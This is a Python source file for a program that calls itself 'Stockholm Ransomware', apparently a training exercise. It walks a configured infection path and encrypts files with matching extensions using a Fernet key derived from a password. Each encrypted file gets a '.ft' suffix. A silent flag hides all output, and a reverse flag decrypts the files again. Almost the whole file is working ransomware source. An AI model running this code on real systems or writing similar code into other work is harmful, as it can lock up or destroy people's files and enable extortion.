import os
import sys
import config
import base64
from cryptography.fernet import Fernet
from cryptography.fernet import InvalidToken
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def derive_key(password) -> bytes:
	salt = b'saltysalt@$)*&@*(@#()*#$KFPOWKFWPO'
	kdf = PBKDF2HMAC(
		algorithm=hashes.SHA256(),
		length=32,
		salt=salt,
		iterations=100000,
	)
	key = base64.urlsafe_b64encode(kdf.derive(password.encode("utf-8")))
	return key

def	showHelp():
	print("Stockholm Ransomware Help:")
	print("[-v|-version] : Show the program's version")
	print("[-h|-help] : Show the help page (this what you're looking at)")
	print("[-r|-reverse] ENCRYPTION_KEY: Decrypt files if the given ENCRYPTION_KEY is valid")
	print("[-s|-silent] : Silence all output message")
	sys.exit()

def	showVersion():
	print("Stockholm Ransomware v1.0.0")
	sys.exit()

def setValue(settings: dict, attr: str, value: bool):
	settings[attr] = value

def encryptFile(path, settings, extension):
	output = ""
	try: # reading file content and encrypt/decrypt
		with open(path, "rb") as file:
			content = file.read()
			if settings["reverse"] != True:
				output = Fernet(settings["key"]).encrypt(content)
			else:
				output = Fernet(settings["key"]).decrypt(content)
	except Exception as e:
		if settings["silent"] != True:
			if isinstance(e, InvalidToken):
				sys.exit("Error : Invalid ENCRYPTION_KEY !")
			else:
				print(f"Error : cannot read '{path}' ! ({e})")
		return
	finally:
		file.close()

	try: # write changes to file
		with open(path, "wb") as file:
			file.write(output)
	except Exception as e:
		if settings["silent"] != True:
			print(f"Error : cannot write '{path}' ! ({e})")
		return
	finally:
		file.close()

	if settings["reverse"] != True and extension != ".ft": # add .ft to encrypted file
		new_filename = path + ".ft"
		try:
			os.rename(path, new_filename)
		except Exception as e:
			if settings["silent"] != True:
				print(f"Error : cannot rename '{path}' ! ({e})")
				return
	elif settings["reverse"] == True and extension == ".ft": # remove .ft from decrypted file
		new_filename = path.replace(".ft", "")
		try:
			os.rename(path, new_filename)
		except Exception as e:
			if settings["silent"] != True:
				print(f"Error : cannot rename '{path}' ! ({e})")
				return

	if settings["silent"] != True:
		if settings["reverse"] != True:
			print(f"'{path}' encrypted")
		else:
			print(f"'{path}' decrypted")
	

def main(settings: dict):
	for dirpath, subdirs, files in os.walk(config.INFECTION_PATH, followlinks=False):
		for file in files:
			full_path = os.path.join(dirpath, file)
			filename = os.path.basename(full_path)
			extension = os.path.splitext(filename)[1]
			if (extension in config.INFECTION_EXTENSIONS and settings["reverse"] == False) or (extension == '.ft' and settings["reverse"] == True):
				encryptFile(full_path, settings, extension)

	return

if (__name__ == "__main__"):
	i = 0
	settings = {"reverse": False, "silent": False, "key": ""}
	flags = [
		{
			"flag": "-h",
			"flag_full": "-help",
			"function": showHelp,
			"args": []
		},
		{
			"flag": "-v",
			"flag_full": "-version",
			"function": showVersion,
			"args": []
		},
		{
			"flag": "-r",
			"flag_full": "-reverse",
			"function": setValue,
			"args": [settings, "reverse", True]
		},
		{
			"flag": "-s",
			"flag_full": "-silent",
			"function": setValue,
			"args": [settings, "silent", True]
		}
	]
	if (len(sys.argv) < 2 or len(sys.argv) > 4):
		sys.exit("Usage : python3 ./stockholm.py [-hvrs] ENCRYPTION_KEY")
	if (((sys.argv[1] == '-h' or sys.argv[1] == '-help') and len(sys.argv) >= 3) or ((sys.argv[1] == '-v' or sys.argv[1] == '-version') and len(sys.argv) >= 3)):
		sys.exit("Usage : python3 ./stockholm.py [-hvrs] ENCRYPTION_KEY")
	for i, arg in enumerate(sys.argv):
		if i == 0 or (i > 0 and (sys.argv[i - 1] == '-r' or sys.argv[i - 1] == '-reverse')):
			continue
		for flag in flags:
			if arg == flag["flag"] or arg == flag["flag_full"]:
				flag["function"](*flag["args"])
				break
		else:
			if i + 1 == len(sys.argv):
				settings["key"] = derive_key(arg)
			else:
				sys.exit("Usage : python3 ./stockholm.py [-hvrs] ENCRYPTION_KEY")
		if (arg == '-r' or arg == '-reverse'):
			if len(sys.argv) > i + 1:
				if len(sys.argv[i + 1]) < 16:
					sys.exit("Error: ENCRYPTION_KEY must be at least 16 characters long.")
				settings["key"] = derive_key(sys.argv[i + 1])
			else:
				sys.exit("Usage : python3 ./stockholm.py [-hvrs] ENCRYPTION_KEY")
	main(settings)